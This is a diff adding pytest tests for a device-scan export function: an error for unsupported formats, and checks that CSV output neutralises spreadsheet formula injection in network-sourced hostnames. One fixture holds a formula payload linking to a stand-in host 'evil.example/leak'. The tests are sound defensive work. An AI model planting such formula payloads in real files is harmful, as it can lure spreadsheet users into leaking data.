@@ -108,3 +108,57 @@ class TestExportDevicesFormatOverride:
         path = str(tmp_path / "scan.dat")
         with pytest.raises(ValueError):
             export_devices(DEVICES, path)
+
+    def test_explicit_unsupported_format_raises(self, tmp_path):
+        """An explicit fmt that isn't 'csv'/'json' used to fall through
+        to the JSON branch silently instead of erroring."""
+        path = str(tmp_path / "scan.csv")
+        with pytest.raises(ValueError, match="unsupported export format"):
+            export_devices(DEVICES, path, fmt="xml")
+
+
+class TestExportDevicesCsvFormulaInjection:
+    """Exported fields (hostname especially) are network-sourced - e.g.
+    a device's DHCP hostname - and untrusted. A cell value starting
+    with =, +, -, @ is read as a formula by Excel/LibreOffice/Google
+    Sheets when the CSV is opened: the classic "CSV injection" bug.
+    """
+
+    def test_formula_prefixed_hostname_is_neutralised(self, tmp_path):
+        devices: list[dict[str, typing.Any]] = [{
+            "ip": "192.168.1.1", "mac": "aa:bb:cc:dd:ee:ff",
+            "vendor": "Acme Inc.",
+            "hostname": '=HYPERLINK("http://evil.example/leak","click")',
+        }]
+        path = str(tmp_path / "scan.csv")
+        export_devices(devices, path)
+
+        with open(path, newline="") as f:
+            rows = list(csv.DictReader(f))
+        assert rows[0]["hostname"] == (
+            '\'=HYPERLINK("http://evil.example/leak","click")'
+        )
+        assert not rows[0]["hostname"].startswith("=")
+
+    @pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
+    def test_each_formula_trigger_character_is_neutralised(
+        self, tmp_path, trigger
+    ):
+        devices: list[dict[str, typing.Any]] = [{
+            "ip": "192.168.1.1", "mac": "aa:bb:cc:dd:ee:ff",
+            "vendor": None, "hostname": f"{trigger}SUM(1,1)",
+        }]
+        path = str(tmp_path / "scan.csv")
+        export_devices(devices, path)
+
+        with open(path, newline="") as f:
+            rows = list(csv.DictReader(f))
+        assert rows[0]["hostname"] == f"'{trigger}SUM(1,1)"
+
+    def test_normal_hostnames_are_left_untouched(self, tmp_path):
+        path = str(tmp_path / "scan.csv")
+        export_devices(DEVICES, path)
+
+        with open(path, newline="") as f:
+            rows = list(csv.DictReader(f))
+        assert rows[0]["hostname"] == "router.local"
